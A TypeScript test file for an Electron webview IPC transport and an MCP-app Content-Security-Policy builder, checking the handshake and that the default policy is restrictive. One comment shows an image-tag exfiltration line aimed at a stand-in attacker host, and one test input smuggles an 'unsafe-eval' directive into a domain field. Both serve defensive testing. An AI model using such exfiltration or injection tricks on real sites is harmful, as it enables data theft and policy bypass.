import { describe, expect, it, vi } from "vitest";
import {
  SANDBOX_PROXY_READY_METHOD,
  SANDBOX_RESOURCE_READY_METHOD,
  type McpUiResourceCsp as UpstreamMcpUiResourceCsp,
} from "@modelcontextprotocol/ext-apps";
import type { McpUiResourceCsp } from "../../../../mcp/types.js";
import { buildMcpCsp, buildMcpCspHeader } from "../../../../shared/mcp-app-csp.js";
import {
  MCP_APP_BRIDGE_CHANNEL,
  SANDBOX_PROXY_READY,
  SANDBOX_RESOURCE_READY,
} from "../../../../shared/mcp-app-bridge-contract.js";
import { WebviewIpcTransport } from "../webview-ipc-transport.js";

/**
 * A fake Electron <webview>: `send` is host→guest, and `emit` replays a guest→host
 * `ipc-message` event.
 */
function makeWebview() {
  const listeners: Array<(event: Event) => void> = [];
  return {
    send: vi.fn<(channel: string, ...args: unknown[]) => void>(),
    addEventListener: vi.fn((_type: string, listener: (event: Event) => void) => {
      listeners.push(listener);
    }),
    removeEventListener: vi.fn((_type: string, listener: (event: Event) => void) => {
      const i = listeners.indexOf(listener);
      if (i >= 0) listeners.splice(i, 1);
    }),
    /** Replay a guest→host `ipc-message` event. */
    emit(channel: string, frame: unknown) {
      const event = new Event("ipc-message") as Event & { channel: string; args: unknown[] };
      event.channel = channel;
      event.args = [frame];
      for (const l of [...listeners]) l(event);
    },
    listenerCount: () => listeners.length,
  };
}

describe("mcp-app bridge wire contract", () => {
  // The relay preload cannot import ext-apps (it would drag zod + the SDK Protocol
  // into a preload that only forwards opaque frames), so it re-declares these two
  // wire literals. This test is the anti-drift guard: an upstream rename fails here
  // instead of silently deadlocking the handshake.
  it("re-declared sandbox method literals match the installed ext-apps constants", () => {
    expect(SANDBOX_PROXY_READY).toBe(SANDBOX_PROXY_READY_METHOD);
    expect(SANDBOX_RESOURCE_READY).toBe(SANDBOX_RESOURCE_READY_METHOD);
  });
});

describe("WebviewIpcTransport", () => {
  it("delivers guest frames to onmessage once started", async () => {
    const webview = makeWebview();
    const transport = new WebviewIpcTransport(webview);
    const seen: unknown[] = [];
    transport.onmessage = (m) => seen.push(m);

    await transport.start();
    webview.emit(MCP_APP_BRIDGE_CHANNEL, { jsonrpc: "2.0", id: 1, method: "ui/initialize" });

    expect(seen).toEqual([{ jsonrpc: "2.0", id: 1, method: "ui/initialize" }]);
  });

  it("buffers frames that arrive BEFORE start() and replays them", async () => {
    // The relay preload announces sandbox-proxy-ready the moment the proxy document
    // loads, which can beat AppBridge.connect(). Dropping it would deadlock the
    // handshake: the host would never send the app HTML.
    const webview = makeWebview();
    const transport = new WebviewIpcTransport(webview);
    const seen: unknown[] = [];
    transport.onmessage = (m) => seen.push(m);

    webview.emit(MCP_APP_BRIDGE_CHANNEL, {
      jsonrpc: "2.0",
      method: SANDBOX_PROXY_READY,
      params: {},
    });
    expect(seen).toEqual([]); // not started yet

    await transport.start();
    expect(seen).toEqual([{ jsonrpc: "2.0", method: SANDBOX_PROXY_READY, params: {} }]);
  });

  it("ignores ipc-message events on other channels", async () => {
    const webview = makeWebview();
    const transport = new WebviewIpcTransport(webview);
    const seen: unknown[] = [];
    transport.onmessage = (m) => seen.push(m);
    await transport.start();

    webview.emit("some-other-channel", { jsonrpc: "2.0", id: 9 });

    expect(seen).toEqual([]);
  });

  it("sends host frames over the bridge channel", async () => {
    const webview = makeWebview();
    const transport = new WebviewIpcTransport(webview);
    await transport.start();

    await transport.send({ jsonrpc: "2.0", id: 2, result: {} } as never);

    expect(webview.send).toHaveBeenCalledWith(MCP_APP_BRIDGE_CHANNEL, {
      jsonrpc: "2.0",
      id: 2,
      result: {},
    });
  });

  it("close() detaches the listener and fires onclose", async () => {
    const webview = makeWebview();
    const transport = new WebviewIpcTransport(webview);
    const onclose = vi.fn();
    transport.onclose = onclose;
    await transport.start();
    expect(webview.listenerCount()).toBe(1);

    await transport.close();

    expect(onclose).toHaveBeenCalledOnce();
    expect(webview.listenerCount()).toBe(0);
  });
});

describe("MCP-App CSP (per-resource envelope, built in main)", () => {
  it("our McpUiResourceCsp is assignable to the upstream spec type (anti-drift pin)", () => {
    // We re-declare the spec shape locally because ext-apps' .d.ts files use
    // extensionless relative imports that don't resolve under NodeNext. This pin
    // makes an upstream shape change a compile error here, not a silent drift.
    const ours: McpUiResourceCsp = {
      connectDomains: ["https://api.example.com"],
      resourceDomains: ["https://cdn.example.com"],
      frameDomains: ["https://frame.example.com"],
      baseUriDomains: ["https://base.example.com"],
    };
    const upstream: UpstreamMcpUiResourceCsp = ours;
    expect(upstream.connectDomains).toEqual(["https://api.example.com"]);
  });

  it("defaults are RESTRICTIVE — no https: wildcard, no hardcoded CDN allowlist", () => {
    // A blanket permissive ceiling would hand every app every other app's
    // allowances (spec No-Loosening MUST: the host MUST NOT allow undeclared
    // domains). `img-src ... https:` was also a plain exfiltration channel:
    // `<img src="https://attacker/?d=…">` leaks even with `connect-src 'none'`.
    const header = buildMcpCspHeader();
    expect(header).toContain("default-src 'none'");
    expect(header).toContain("connect-src 'none'");
    expect(header).toContain("img-src data: blob:");
    expect(header).not.toMatch(/img-src[^;]*\bhttps:/);
    expect(header).not.toContain("cdn.jsdelivr.net");
    expect(header).not.toContain("unpkg.com");
    expect(header).toContain("frame-ancestors 'none'");
    expect(header).not.toContain("<meta"); // header form, not meta
  });

  it("connectDomains opens ONLY connect-src", () => {
    const header = buildMcpCspHeader({ connectDomains: ["https://api.example.com"] });
    expect(header).toContain("connect-src https://api.example.com");
    // Must not bleed into other directives.
    expect(header).toMatch(/img-src data: blob:(;|$)/);
  });

  it("resourceDomains fans out across script/style/img/font/media", () => {
    const header = buildMcpCspHeader({ resourceDomains: ["https://cdn.example.com"] });
    for (const directive of ["script-src", "style-src", "img-src", "font-src", "media-src"]) {
      expect(header).toContain(`${directive} `);
      const section = header.split("; ").find((d) => d.startsWith(`${directive} `))!;
      expect(section).toContain("https://cdn.example.com");
    }
    // NOT a network directive — resourceDomains must not grant fetch/XHR.
    expect(header).toContain("connect-src 'none'");
  });

  it("rejects non-https, wildcard and separator-smuggling origins", () => {
    const header = buildMcpCspHeader({
      connectDomains: [
        "http://insecure.example.com",
        "https://*.evil.example.com",
        "https://ok.example.com; script-src 'unsafe-eval'",
        "https://api.example.com",
      ],
    });
    expect(header).toContain("connect-src https://api.example.com");
    expect(header).not.toContain("insecure.example.com");
    expect(header).not.toContain("*.evil.example.com");
    expect(header).not.toContain("unsafe-eval");
  });

  it("baseUriDomains/frameDomains open only their own directive", () => {
    const header = buildMcpCspHeader({ baseUriDomains: ["https://base.example.com"] });
    expect(header).toContain("base-uri https://base.example.com");
    expect(header).toContain("frame-src 'none'");
  });

  it("buildMcpCsp wraps the same policy in <meta> form", () => {
    const wrapped = buildMcpCsp({ resourceDomains: ["https://images.example.com"] });
    expect(wrapped).toContain('<meta http-equiv="Content-Security-Policy"');
    expect(wrapped).toContain("https://images.example.com");
  });
});
